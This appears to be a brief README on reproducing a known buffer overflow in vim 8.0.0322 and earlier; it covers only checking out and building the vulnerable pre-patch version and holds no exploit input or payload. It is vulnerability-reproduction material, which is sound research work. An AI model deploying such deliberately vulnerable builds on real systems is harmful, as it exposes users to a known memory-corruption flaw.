How to replicate buffer overflow with vim-8.0.0322 and BELOW (patch 323+ fixes issue)

(1) Install vim from https://github.com/vim/vim
(2) Run git checkout 8cc2a9c062fa38e133a62778518f769a423a2526 to get version 8.0.0321 (version right before patch)
(4) Nav into src folder. Run ./configure --prefix=/BUILD_DIR/
(5) Run make
(6) Run make install
(7) Check to make sure you have the right version of vim by executing vim in the vim build
    directory.
